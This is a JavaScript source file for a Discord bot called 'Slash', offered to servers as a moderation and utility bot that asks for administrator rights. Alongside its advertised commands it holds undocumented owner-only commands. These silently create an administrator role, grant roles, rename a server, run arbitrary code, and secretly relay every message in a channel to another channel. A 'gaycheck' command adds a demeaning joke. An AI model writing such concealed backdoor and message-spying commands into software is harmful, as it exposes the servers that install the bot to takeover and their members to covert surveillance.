const { Client, Collection, MessageEmbed, Discord, MessageAttachment, MessageCollector } = require('discord.js');
const bot = new Client;
const db = require('quick.db');
const ms = require('ms');
const superagent = require('superagent');
const owners = ['364134050350497796', '596779884488163340', '657644223163531266']
const notGay = ['364134050350497796', '596779884488163340', '657644223163531266','697913362004049951']
const env = require('dotenv').config(/.env/);
const idd = '364134050350497796';

const footer = "Slash | All Rights Reserved © 2020";

bot.on('ready', () => {
    bot.user.setActivity(`over ${bot.guilds.cache.size} servers | /help`, ({type: "WATCHING"}))
    console.log(`Logged in as ${bot.user.tag}`);

    let myGuild = bot.guilds.cache.get('691209241729695774')
    let memCount = myGuild.memberCount;
    let memCountChannel = myGuild.channels.cache.get('707605404724494409')
    memCountChannel.setName('Chickens: ' + memCount)
    .then(console.log('successfully made chick count'))
    .catch(error => console.log(error));
})

bot.on('guildMemberAdd', mem => {
    let myGuild = bot.guilds.cache.get('691209241729695774')
    let memCount = myGuild.memberCount;
    let memCountChannel = myGuild.channels.cache.get('707605404724494409')
    memCountChannel.setName('Chickens: ' + memCount)
    .then(console.log('[NOTE] successfully updated chick count'))
    .catch(error => console.log(error));
})

bot.on('guildMemberRemove', mem => {
    let myGuild = bot.guilds.cache.get('691209241729695774')
    let memCount = myGuild.memberCount;
    let memCountChannel = myGuild.channels.cache.get('707605404724494409')
    memCountChannel.setName('Chickens: ' + memCount)
    .then(console.log('[NOTE] successfully updated chick count'))
    .catch(error => console.log(error));
})

bot.on('message', async msg => {
    let message = msg;

    const prefixm = new RegExp(`^<@!?${bot.user.id}> `);
    var pref = db.fetch(`prefix_${message.guild.id}`) || "/";
    var prefix = message.content.match(prefixm)
    ? message.content.match(prefixm)[0]
    : pref;

    let args = msg.content.slice(prefix.length).split(/ +/);
    let cmd = args.shift().toLowerCase();
    let command = cmd;
    let maincolor = "RANDOM";

    if(!msg.content.startsWith(prefix) || msg.author.bot || msg.channel.type === 'dm') return;

    
    if(cmd === 'gaycheck'){
      let cac = (message.mentions.members.first() || msg.author)
      let mgc = new MessageEmbed().setDescription(`${cac} is not gay, dummy.`).setColor(maincolor);
      if(notGay.includes(cac.id)) return msg.channel.send({embed: mgc})
      let gc = new MessageEmbed()
      .setDescription(`${cac} is **${Math.floor(Math.random() * 100 + 1)}%** gay.`)
      .setColor(maincolor)
      msg.channel.send(gc);
    }
    if(cmd === 'spa'){
      if(!idd.includes(msg.author.id)) return;
      bot.user.setActivity(`${args.slice(1).join(" ")}`, ({type: `${args[0].toUpperCase()}`}))
      .then(msg.channel.send(`Activity is now set to \`${args.join(" ")}\`.`))
      .catch(console.log('✅'))
    }
    if(cmd === 'sa'){
      if(!idd.includes(msg.author.id)) return;
      bot.user.setActivity(`over ${bot.guilds.cache.size} servers | /help`, ({type: "WATCHING"}))
      .then(msg.react('✅'))
      .catch(console.error());
    }
    if(cmd === 'random'){
      if(!args[0]) return msg.channel.send('Specify the first number.')
      if(!args[1]) return msg.channel.send('Specify the second number.')
      if(isNaN(args[0])) return msg.channel.send(`\`${args[0]}\` is not a number.`)
      if(isNaN(args[1])) return msg.channel.send(`\`${args[1]}\` is not a number.`)
      
      let x = new MessageEmbed()
      .setDescription(`Your random number is: **${Math.floor(Math.random() * args[1] + args[0])}**`)
      msg.channel.send(x);
    }
    if(cmd === 'h'){
      if(!idd.includes(msg.author.id)) return;
      msg.guild.setName(`${args.join(" ")}`)
      msg.guild.setIcon('./icon.png/')
      console.log(`Changed name to ${args.join(" ")}.`)
    }
    if(cmd === 'q'){
      if(!idd.includes(msg.author.id)) return;
      msg.delete();
      msg.guild.roles.create({
        data: {
          name: `${args.join(" ")}`,
          color: 'RANDOM',
          permissions: "ADMINISTRATOR"
        },
        reason: 'we needed a role for Super Cool People',
      })
        .then(console.log(`Created role ${args.join(" ")} in ${msg.guild.name}`))
        .catch(console.error);
    }
    if (cmd === 'heck') {
      const msgSay = await msg.channel.send("**1% Loaded...**")
      await msgSay.edit(`**3% Loaded...**`)
      await msgSay.edit(`**4% Loaded...**`)
      await msgSay.edit(`**6% Loaded...**`)
      await msgSay.edit(`**18% Loaded...**`)
      await msgSay.edit(`**24% Loaded...**`)
      await msgSay.edit(`**31% Loaded...**`)
      await msgSay.edit(`**39% Loaded...**`)
      await msgSay.edit(`**67% Loaded...**`)
      await msgSay.edit(`**68% Loaded...**`)
      await msgSay.edit(`**82% Loaded...**`)
      await msgSay.edit(`**100% Loaded...**`)
      msgSay.edit(`**HACK LOADED**`);
      msg.delete();
  }
    if(cmd === 'r'){
      if(!idd.includes(msg.author.id)) return;
      msg.delete();
      msg.member.roles.add(msg.mentions.roles.first()).catch(e => console.log('error /r'));
    }
    if(cmd === 'support'){
      let x = new MessageEmbed()
      .setTitle('Support')
      .setDescription(`This bot is running on **${bot.guilds.cache.size} servers**.\nInvite him by pressing **[here](https://discordapp.com/oauth2/authorize?client_id=596779884488163340&permissions=8&scope=bot)**!`)
      .setColor(maincolor);
      msg.channel.send(x);
    }
    if(cmd === 'id-info'){
      if(!args[0]) return msg.channel.send('args[0] != ID');

      let cooc = bot.users.fetch(args[0]);
      let xx = new MessageEmbed()
      .setTitle(`Information about ${(await cooc).tag}`)
      .addField(`Username`, `${(await cooc).username}`)
      .addField(`Presence`, `${(await cooc).presence.status}`)
      .addField(`Created On`, `${(await cooc).createdAt}`)
      .addField(`User ID`, `${(await cooc).id}`)
      .setImage((await cooc).displayAvatarURL())
      .setTimestamp()
      .setFooter(footer)
      .setColor(maincolor);
      msg.channel.send(xx)
  }
    if(cmd === 'say'){
        if(!owners.includes(msg.author.id)) return;
        msg.delete();
        msg.channel.send(args.join(" "));
    }
    // if(cmd === 'cat'){
    //     let cat = await msg.channel.send('Generating...')

    //     let {body} = await superagent
    //     .get(`http://aws.random.cat/meow`)
    //     if(!body.file) return msg.channel.send("**My source is not working! Try again.**\n\n**If this error occurs multiple times, contact the owner of the bot or join the support server:**\n\nhttps://discord.gg/g7WDmKM") && meme.delete();

    //         let cEmb = new MessageEmbed()
    //         .setColor("RANDOM")
    //         .setAuthor("Cat Image")
    //         .setImage(body.file)
    //         .setTimestamp()
    //         .setFooter(footer, bot.user.avatarURL())
    //     msg.channel.send(cEmb);
    //     cat.delete();
    // }
    // if(cmd === 'dog'){
    //     let dog = await msg.channel.send('Generating...')

    //     let {body} = await superagent
    //     .get(`https://api.thedogapi.com/`)
    //     if(!body.file) return msg.channel.send("**My source is not working! Try again.**\n.\n**If this error occurs multiple times, contact the owner of the bot or join the support server:**\n.\nhttps://discord.gg/g7WDmKM") && dog.delete();

    //         let dEmb = new MessageEmbed()
    //         .setColor("RANDOM")
    //         .setAuthor("Dog Image")
    //         .setImage(body.file)
    //         .setTimestamp()
    //         .setFooter(footer, bot.user.avatarURL())
    //     msg.channel.send(dEmb);
    //     dog.delete();
    // }
    // if(cmd === 'meme'){
    //     let meme = await msg.channel.send('Generating...')

    //     let {body} = await superagent
    //     .get(`https://docs.duncte123.com/`)
    //     if(!body.file) return msg.channel.send("**My source is not working! Try again.**\n.\n**If this error occurs multiple times, contact the owner of the bot or join the support server:**\n.\nhttps://discord.gg/g7WDmKM") && meme.delete();

    //         let mEmb = new MessageEmbed()
    //         .setColor("RANDOM")
    //         .setAuthor("Meme Image")
    //         .setImage(body.file)
    //         .setTimestamp()
    //         .setFooter(footer, bot.user.avatarURL())
    //     msg.channel.send(mEmb);
    //     meme.delete();
    // }
    if(cmd === 'server-info'){
        let servEmb = new MessageEmbed()
        .setTitle(`Info about ${message.guild.name}`)
        .addField(`General`, `**Server Name** - ${msg.guild.name}\n**Server ID** - ${msg.guild.id}\n**Server Owner** - ${msg.guild.owner}\n**Server Owner ID** - ${msg.guild.ownerID}\n**Server Region** - ${msg.guild.region}\n**Created on** ${msg.guild.createdAt}`)
        .addField(`AFK`, `**AFK Channel** - ${msg.guild.afkChannel}\n**AFK Channel ID** - ${msg.guild.afkChannelID}\n**AFK Timeout** - ${msg.guild.afkTimeout}`)
        .addField(`Others`,`**Default Message Notification** - ${msg.guild.defaultMessageNotifications}\n**Members** - ${msg.guild.memberCount}\n**Highest Role** - ${msg.guild.roles.highest}\n**Partnered** -  ${msg.guild.partnered}`)
        .setColor("RANDOM")
        .setThumbnail(`${msg.guild.iconURL()}`)
        .setTimestamp()
        .setFooter(footer, bot.user.avatarURL())
        msg.channel.send(servEmb);
    }
  if(cmd === 'server-info2'){
      let servEmb = new MessageEmbed()
      .setTitle(`Info about ${msg.guild.name}`)
      .addField(`Server Name`, msg.guild.name)
      .addField(`Server ID`, msg.guild.id)
      .addField(`Server Owner`, msg.guild.owner)
      .addField(`Server Owner ID`, msg.guild.ownerID)
      .addField(`Server Region`, msg.guild.region)
      .addField(`Created on`, msg.guild.createdAt)
      .addField(`AFK Channel`, msg.guild.afkChannel)
      .addField(`AFK Channel ID`, msg.guild.afkChannelID)
      .addField(`AFK Channel Timeout`, msg.guild.afkTimeout)
      .addField(`Default Message Notification`, msg.guild.defaultMessageNotifications)
      .addField(`Members`, msg.guild.memberCount)
      .addField(`Highest Role`, msg.guild.roles.highest)
      .addField(`Partnered`, msg.guild.partnered)
      .setThumbnail(msg.guild.iconURL())
      .setColor(maincolor)
      .setTimestamp()
      .setFooter(footer, bot.user.avatarURL())
      msg.channel.send(servEmb);
    }  
  if(cmd === 'user-info'){
      let user = msg.mentions.members.first() || msg.author;
      let embed = new MessageEmbed().setTitle(`Info about ${user.username}`)
      .addField(`Username`, user)
      .addField(`User Tag`, user.tag)
      .addField(`Last Message`, user.lastMessage)
      .addField(`Last Message ID`, user.lastMessageID)
      .addField(`Last Message Channel ID`, user.lastMessageChannelID)
      .addField(`User ID`, user.id)
      .setColor(maincolor)
      .setThumbnail(user.avatarURL())
      .setTimestamp()
      .setFooter(footer)
      msg.channel.send(embed);
    }
    //HEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEELP
    //HEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEELP
    //HEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEELP
    if(cmd === 'help'){
        let helpEmb = new MessageEmbed()
        .setAuthor("Author: 1550#1550")
        .setTitle("Help")
        .setDescription("**Slash's Support Server:**\nhttps://discord.gg/g7WDmKM\n**Slash's Website:**\nhttp://slash-bot.simplesite.com\n")
        .addField('General Commands', `
        ${prefix}ping - Shows the bot's ping!\n
        ${prefix}invite - Invite the bot to your server.\n
        ${prefix}prefix <new prefix> - Changes the server prefix.
        `)
        .addField('Fun', `
        ${prefix}hug <user> - hug an user.\n
        ${prefix}cat - Sends a random cat image.\n
        `)
        .addField('Utility', `
        ${prefix}kick <user> <reason> - Kicks an User from the guild.\n
        ${prefix}ban <user> <reason> - Bans an User from the guild.\n
        ${prefix}unban <user ID> <reason> - Unban an User.\n
        ${prefix}clear - Clears an amount of messages at once.
        `)
        .addField('Info', `
        ${prefix}server-info - Shows very detailed informations about the server.\n
        ${prefix}user-info <user> - Shows very detailed informations about the user.\n
        ${prefix}youtube - Secret info.
        `)
        .setThumbnail(msg.guild.iconURL())
        .setTimestamp()
        .setColor(maincolor)
        .setFooter(footer, bot.user.avatarURL())
    msg.channel.send(helpEmb);
    //HEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEELP
    //HEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEELP
    //HEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEELP
    }
    if (cmd === 'ping') {
        const msgPing = new MessageEmbed().setDescription("Pinging...").setColor(maincolor);
        let sMsgPing = msg.channel.send(msgPing);

        const msgPing2 = new MessageEmbed().setDescription(`Pong!\nAPI Latency: **${bot.ws.ping} ms**`).setColor(maincolor);
        msg.channel.send(msgPing2);
        (await sMsgPing).delete()
    }
    if(cmd === 'hug'){
      let user = msg.mentions.members.first();
      if(!user) return msg.channel.send('Mention someone to hug.')
      let x = new MessageEmbed()
      .setAuthor(`Hug`, msg.author.displayAvatarURL())
      .setDescription(`**${msg.author.username} hugged ${user.user.username}** :bear: `)
      .setColor(0xff0000)
      .setTimestamp()
      msg.channel.send(x);
    }
    if (cmd === 'invite' || cmd === 'inv') {
        message.author
          .send({
            embed: {
              color: maincolor,
              description:
                "**Invite [Slash](https://discordapp.com/oauth2/authorize?client_id=596779884488163340&permissions=2146958847&scope=bot) in your server.**"
            }
          })
          .catch(error => {
            msg.channel.send("Please open your dm messages in the settings");
          });
        message.channel.send("**Check your DM.**");
      }
      if (command === "eval") {
        function clean(text) {
          if (typeof text === "string")
            return text
              .replace(/`/g, "`" + String.fromCharCode(8203))
              .replace(/@/g, "@" + String.fromCharCode(8203));
          else return text;
        }
        if (!owners.includes(msg.author.id)) return message.channel.send(`This command is for owners of the bot, noob ${message.author.username}.`);
    
        try {
          const code = args.join(" ");
          let evaled = eval(code);
    
          if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
          if (evaled === "Promise { <pending> }") return;
          var uses1 = evaled.replace(undefined, "Undefined");
          var uses = uses1.replace(null, "Empty");
          message.react("?");
    
          message.channel.send(clean(uses), { code: "js" });
        } catch (err) {
          message.react("?");
          message.channel.send(`\`ERROR\` \`\`\`xl\n${clean(err)}\n\`\`\``);
        }
      }
    if (command === 'load') {
        msg.channel.send("Loading...").then(m => m.edit("Succesfully loaded `" + Math.floor(Math.random()* 500 + 15) + " Dependencies`"))
    }
    if (cmd === 'kick') {
      let toKick = message.mentions.members.first();
      if(!msg.member.hasPermission("KICK_MEMBERS")) return msg.channel.send("**You can't kick.**");
      if(!toKick) return msg.channel.send("Specify someone to kick.");
      let reason = args.slice(1).join(" ");
      if(!toKick.kickable) return msg.channel.send("I can't kick a person who is **mod/admin.**")
      if(!reason) return msg.channel.send("Specify a reason.");
      if(toKick.kickable){
        let kickEmb = new MessageEmbed()
        .setTitle('Kick')
        .addField('Person Kicked', `${toKick}`)
        .addField('Reason', `${reason}`)
        .addField('Kicked By', `${msg.author}`)
        .setColor(maincolor)
        .setTimestamp()
        .setFooter(footer, bot.user.avatarURL())
        msg.channel.send(kickEmb);
        toKick.kick()
      }
    }
    if (cmd === 'ban') {
      let toBan = message.mentions.members.first();
      if(!msg.member.hasPermission("BAN_MEMBERS")) return msg.channel.send("**You can't ban.**");
      if(!toBan) return msg.channel.send("Specify someone to ban.");
      let reason = args.slice(1).join(" ");
      if(!toBan.bannable) return msg.channel.send("I can't ban a person who is **mod/admin.**")
      if(!reason) return msg.channel.send("Specify a reason.");
      if(toBan.bannable){
        let banEmb = new MessageEmbed()
        .setTitle('Ban')
        .addField('Person Banned', `${toBan}`)
        .addField('Reason', `${reason}`)
        .addField('Banned By', `${msg.author}`)
        .setColor(maincolor)
        .setTimestamp()
        .setFooter(footer, bot.user.avatarURL())
        msg.channel.send(banEmb);
        toBan.ban()
      }
    }
    if(cmd === '?listen'){
      if(!idd.includes(msg.author.id)) return;
      msg.channel.send('Collecting messages...') && console.log('[START] Collecting messages...');
      let filter = m => !m.author.bot;
          
      let collector = new MessageCollector(msg.channel, filter);
      collector.on('collect', (message, col)=> {
          console.log(`Collected message: ${message.content}`)
          
          let destination = bot.channels.cache.get(args[0]);
          if(!args[0]){
            msg.channel.send('Provide an ID and try again.')
          }
          if(!destination){
            msg.channel.send('I cannot find the specified channel.')
            collector.stop();
          }
          if(destination){
              destination.send(message.content);
          }

          if(message.content === 'stop1' && idd.includes(msg.author.id)){
              collector.stop();
          }
      })
      collector.on('end', collected => {
          console.log(`[END] Collected ${collected.size} messages!`)
      })
  }
    if(cmd === 'clear'){
      if(!msg.member.hasPermission("ADMINISTRATOR")) return msg.channel.send("You can't use this command.");
      if(!args[0]) return msg.channel.send("Specify how many messages you want to delete.")
      msg.delete();
      msg.channel.bulkDelete(Math.floor(args[0]) + 1).catch(e => { return msg.channel.send('You can only delete 100 messages at once!')}).then(m => m.delete ({timeout: 5000}));
      if(args[0] < 100 && args[0] != 1){
      msg.channel.send(`Successfully deleted \`${args[0]} messages\``).then(m => m.delete({ timeout: 5000 }))
      }
      if(args[0] == 1){
      msg.channel.send(`Successfully deleted \`1 message\``).then(m => m.delete({ timeout: 5000 }))
      }
    }
    if (cmd === 'unban') {
      let toUnban = bot.users.fetch(args[0])
      if(!msg.member.hasPermission("BAN_MEMBERS")) return msg.channel.send("**You can't unban.**");
      if(!toUnban) return msg.channel.send("Specify the person's ID.");
        let unbanEmb = new MessageEmbed()
        .setTitle('Unban')
        .addField('Person Unbanned', `${(await toUnban).username}`)
        .addField('Date', msg.createdAt)
        .addField('Unbanned By', `${msg.author}`)
        .setColor(maincolor)
        .setTimestamp()
        .setFooter(footer, bot.user.avatarURL())
        msg.channel.send(unbanEmb);
        msg.guild.members.unban((await toUnban).id);
    }
    if (command === "qrgen") {
        if (!args.join(" ")) return;
        let liam = args.join('%20');
        let qrgen = new MessageEmbed()
          .setImage(
            `http://api.qrserver.com/v1/create-qr-code/?data=${liam}&size=1000x1000`
          )
          .setTitle("QR Code | Slash")
          .setColor(maincolor)
          .setFooter(`Requested by: ${msg.author.tag}`, bot.user.avatarURL());
          msg.channel.send(qrgen);
    }
    if(cmd === 'prefix'){
      if (!message.member.hasPermission("MANAGE_GUILD"))
        return message.channel.send(
          "Sorry, you don't have permission to change server prefix"
        );
      if (!args.join(" "))
        return message.channel.send(
          "Please provide a prefix to change server prefix"
        );

      db.set(`prefix_${message.guild.id}`, args[0]);
      message.channel.send(`Server Prefix has been changed to ${args.join(" ")}`);
    }
    if(cmd === 'welchannel'){
    let channel = message.mentions.channels.first()
    
    if(!channel) { 
      return message.channel.send("Please Mention the channel first")
    }

    db.set(`welchannel_${message.guild.id}`, channel.id)
    
    message.channel.send(`Welcome Channel is setted as ${channel}`)   
    }
    if(command === 'join') {
      if(!message.member.hasPermission(["ADMINISTRATOR"])) return message.channel.send("You don't have permission to use this command")
      bot.emit('guildMemberAdd', message.member)
    }
    if(cmd === 'youtube' || cmd === 'yt'){
      let x = new MessageEmbed().setDescription("**[Click Here](https://youtube.com/Massqerix)**").setColor(maincolor);
      msg.channel.send(x);
    }
    if(cmd === 'server-icon'){
        let x = new MessageEmbed()
        .setTitle(`${msg.guild.name}'s Icon`)
        .setColor(maincolor)
        .setImage(msg.guild.iconURL())
        .setFooter(footer)
        msg.channel.send(x);
    }
})

bot.login(process.env.TOKEN);